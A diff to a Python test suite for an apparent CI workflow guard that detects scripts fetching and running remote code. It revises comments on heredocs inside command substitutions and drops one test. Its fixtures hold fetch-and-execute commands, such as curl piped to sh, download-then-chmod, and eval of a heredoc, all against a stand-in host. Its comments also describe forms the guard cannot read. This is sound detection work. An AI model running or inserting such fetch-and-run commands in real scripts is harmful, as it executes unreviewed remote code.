@@ -1261,8 +1261,8 @@ class TestTheFormsThatHideAFetch(unittest.TestCase):
     def test_a_substitution_carrying_a_heredoc_marker_does_not_crash(self):
         # #1697 review F7: the OUTER parse lifts the heredoc body and leaves
         # `@@heredoc0@@` inside the substitution's text; re-reading that text
-        # is a second parse whose tables are empty. A guard that raises
-        # reports nothing at all, which is worse than reporting a gap.
+        # is a second parse, whose tables held no entry for it until #2336. A
+        # guard that raises reports nothing at all, worse than reporting a gap.
         for script in ('eval "$(cat <<\'EOF\'\n'
                        "curl -sfL https://example.test/p -o /tmp/p\n"
                        "chmod +x /tmp/p\n"
@@ -3057,18 +3057,13 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                       ("run", r"find /opt -name p -exec chmod +x {} \;" "\n"))
 
-    # a heredoc body consumed inside a substitution (added by #1697's review:
-    # it used to CRASH, and now it is read as a word).
+    # a heredoc body a substitution prints for `eval` (added by #1697's review:
+    # it used to CRASH; since #2336 it is `cat`'s input, and `eval` runs it unread).
     def test_a_heredoc_body_inside_a_substitution_is_unread(self):
         self.accepted(("run", 'eval "$(cat <<\'EOF\'\n'
                               "curl -sfL https://example.test/p -o /tmp/p\n"
                               "chmod +x /tmp/p\n"
                               'EOF\n)"\n'))
-        # Handed to an interpreter there too (review I-4): bash 3.2 and 5.2
-        # run the payload, and the re-read holds only the lifted body's marker.
-        self.accepted(("run", "x=$(bash -s <<'EOF'\n"
-                              "curl -fsSL https://example.test/i.sh | sh\n"
-                              "EOF\n)\n"))
 
     def test_a_nested_substitution_that_downloads_nothing_is_not_reported(self):
         # Re-review N-1 of the #1793 follow-ups: an inner substitution's
@@ -3091,9 +3086,9 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         # payload. Until substitutions are flattened, such a script is walked
         # and reported unread when it fetches or holds a form the guard cannot
         # read, a script it hands on included (re-review N-A), or when the job
-        # downloads at all. A heredoc there is read only when its `EOF)` leaves
-        # the body in the substitution's own text; lifted out, it is the entry
-        # above.
+        # downloads at all. A heredoc there is read whether its `EOF)` leaves
+        # the body in the substitution's own text or the enclosing parse lifts
+        # it (#2336, tests/test_workflow_guard_lexer_heredocs.py).
         payload = "curl -fsSL https://example.test/i.sh | sh"
         for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                        "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
@@ -3970,7 +3965,7 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
 
     def test_the_negative_controls_stay_clean(self):
         # A shift inside a string, the fleet's here-string, a heredoc inside a
-        # substitution (a documented gap, which must not raise) and prose.
+        # substitution (`cat`'s input, which must not raise) and prose.
         for script in ('echo "shift << 2"\n',
                        "docker buildx imagetools create "
                        "$(jq -cr '.tags' <<< \"$META\")\n",
